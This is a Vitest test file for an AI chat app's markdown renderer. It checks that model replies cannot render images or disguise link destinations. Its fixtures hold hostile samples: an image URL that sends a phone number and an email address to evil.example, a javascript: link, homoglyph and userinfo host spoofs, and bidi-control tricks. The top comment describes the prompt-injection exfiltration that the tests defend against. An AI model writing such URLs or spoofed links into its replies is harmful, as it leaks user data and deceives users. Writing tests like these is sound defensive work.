// @vitest-environment happy-dom
import {
  AssistantRuntimeProvider,
  TextMessagePartProvider,
  type ThreadMessageLike,
  useExternalStoreRuntime,
} from "@assistant-ui/react"
import { MarkdownText } from "@workspace/ui/components/assistant/markdown-text"
import { Thread } from "@workspace/ui/components/assistant/thread"
import {
  act,
  type ComponentProps,
  createElement,
  type ReactElement,
} from "react"
import { createRoot } from "react-dom/client"
import { afterEach, beforeEach, expect, it, vi } from "vitest"
import { contentSecurityPolicy } from "../lib/csp"

/**
 * Model text reaches the thread's markdown renderer, and a prompt injection
 * can make the model write an image whose URL carries workspace data. The
 * browser would fetch it on render, with no approval. So the renderer drops
 * every image, whatever syntax asked for it.
 */
;(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true

const LEAK = "https://evil.example/?d=+447700900123,hello@example.net"
const REPLY = `Done. ![s](${LEAK}) and ![r][ref], <img src="${LEAK}">

See [Open your new site](${LEAK}), [example.net](https://example.net/a),
https://example.net/b and [![a](${LEAK})](https://ok.example/).

Write to [us](mailto:hello@example.net), read the note[^1], or [run](javascript:alert(1)).

[ref]: ${LEAK}
[^1]: A fictional note.`

beforeEach(() => {
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe = () => undefined
      unobserve = () => undefined
      disconnect = () => undefined
    }
  )
  Element.prototype.scrollTo ??= () => undefined
})

let unmount: (() => Promise<void>) | undefined
afterEach(async () => {
  await unmount?.()
  unmount = undefined
  vi.unstubAllGlobals()
})

const MESSAGES: ThreadMessageLike[] = [
  {
    id: "msg_reply",
    role: "assistant",
    content: [{ type: "text", text: REPLY }],
    status: { type: "complete", reason: "stop" },
  },
]

function Chat() {
  const runtime = useExternalStoreRuntime({
    messages: MESSAGES,
    convertMessage: (message: ThreadMessageLike) => message,
    onNew: async () => undefined,
  })
  return createElement(
    AssistantRuntimeProvider,
    { runtime },
    createElement(Thread, { autoFocus: false })
  )
}

async function render(element: ReactElement = createElement(Chat)) {
  const container = document.createElement("div")
  document.body.appendChild(container)
  const root = createRoot(container)
  await act(async () => root.render(element))
  unmount = async () => {
    await act(async () => root.unmount())
    container.remove()
  }
  await vi.waitFor(() => expect(container.textContent).toContain("Done."))
  return container
}

it("a reply renders no image, by any markdown syntax, and fetches nothing", async () => {
  const chat = await render()
  expect(chat.querySelectorAll("img")).toHaveLength(0)
  // Raw HTML shows as the text it is, never as an element.
  expect(chat.textContent).toContain("<img")
})

const links = (container: HTMLElement) =>
  Object.fromEntries(
    [...container.querySelectorAll<HTMLAnchorElement>(".aui-md a")].map(
      (link) => [link.textContent?.replace(/\u00a0/g, " "), link]
    )
  )

/** One reply's text through the thread's own renderer. */
const renderText = (text: string) =>
  render(
    createElement(
      TextMessagePartProvider,
      { text: `Done. ${text}` },
      createElement(MarkdownText)
    )
  )

/** The one link in a reply, and the host the app appended to it. */
async function onlyLink(text: string) {
  const [link] = Object.values(links(await renderText(text)))
  return {
    link,
    shown: link?.querySelector(".aui-md-a-host bdi[dir='ltr']")?.textContent,
  }
}

it("a link that leaves the app without a scheme or slashes still names its host", async () => {
  for (const href of ["//evil.example/?d=x", "http:evil.example/?d=x"]) {
    const { link, shown } = await onlyLink(`[Open your site](${href})`)
    expect(shown, href).toBe("evil.example")
    expect(link?.target, href).toBe("_blank")
    expect(link?.rel, href).toBe("noopener noreferrer")
    await unmount?.()
    unmount = undefined
  }
})

it("text that only looks like the host still gets the host after it", async () => {
  const cases = {
    // A Cyrillic "е" in text and host alike.
    "[brightcl\u0435an.co.uk](https://brightcl\u0435an.co.uk/)": /^xn--/,
    "[xn--brightcln-3sb.co.uk](https://xn--brightcln-3sb.co.uk/)": /^xn--/,
    // Text that is the whole href, lookalike host and all.
    "[https://brightcl\u0435an.co.uk/](https://brightcl\u0435an.co.uk/)":
      /^xn--/,
    // Userinfo reads as a host it is not.
    "https://brightclean.remeai.co.uk@evil.example/": /^evil\.example$/,
  }
  for (const [text, host] of Object.entries(cases)) {
    const { shown } = await onlyLink(text)
    expect(shown, text).toMatch(host)
    await unmount?.()
    unmount = undefined
  }
})

it("bidi controls leave the link text, and the host is isolated from it", async () => {
  const { link, shown } = await onlyLink(
    "[\u202Eelpmaxe.live\u2066](https://evil.example/)"
  )
  expect(link?.textContent).not.toMatch(
    /[\u200E\u200F\u202A-\u202E\u2066-\u2069]/
  )
  expect(shown).toBe("evil.example")
})

it("a host the model wrote into the text is not the one the app shows", async () => {
  const { link, shown } = await onlyLink(
    "[Open (brightclean.remeai.co.uk)](https://evil.example/)"
  )
  expect(shown).toBe("evil.example")
  expect(link?.querySelector(".aui-md-a-host")?.className).toContain(
    "text-muted-foreground"
  )
})

it("an external link opens a new tab, names its host and says so", async () => {
  const link = links(await render())[
    "Open your new site (evil.example) (opens in a new tab)"
  ]
  expect(link?.target).toBe("_blank")
  expect(link?.rel).toBe("noopener noreferrer")
  expect(link?.querySelector(".sr-only")?.textContent).toBe(
    " (opens in a new tab)"
  )
})

it("a link whose text is its host shows the host once", async () => {
  const found = links(await render())
  expect(found["example.net (opens in a new tab)"]?.target).toBe("_blank")
  expect(found["https://example.net/b (opens in a new tab)"]?.target).toBe(
    "_blank"
  )
})

it("a link that was only an image is named by its host", async () => {
  const link = links(await render())["ok.example (opens in a new tab)"]
  expect(link?.href).toBe("https://ok.example/")
  expect(link?.querySelector("img")).toBeNull()
})

it("footnote, mailto and blocked links stay in the tab, unchanged", async () => {
  const found = links(await render())
  for (const text of ["us", "1", "run"]) {
    expect(found[text], text).toBeDefined()
    expect(found[text]?.target, text).toBe("")
    expect(found[text]?.rel, text).toBe("")
  }
  expect(found.us?.getAttribute("href")).toBe("mailto:hello@example.net")
  expect(found["1"]?.getAttribute("href")).toMatch(/^#/)
  expect(found.run?.getAttribute("href")).toBe("")
})

it("a caller's own link component still gets the new tab and the host", async () => {
  const container = await render(
    createElement(
      TextMessagePartProvider,
      { text: `Done. [Open your new site](${LEAK})` },
      createElement(MarkdownText, {
        components: {
          a: ({
            node: _,
            ...props
          }: ComponentProps<"a"> & { node?: unknown }) =>
            createElement("a", props),
        },
      })
    )
  )
  const link =
    links(container)["Open your new site (evil.example) (opens in a new tab)"]
  expect(link?.target).toBe("_blank")
  expect(link?.rel).toBe("noopener noreferrer")
})

it("the app lets images load only from itself, data URLs and any remeai.co.uk host", () => {
  expect(contentSecurityPolicy("n").split("; ")).toContain(
    "img-src 'self' data: https://*.remeai.co.uk"
  )
})
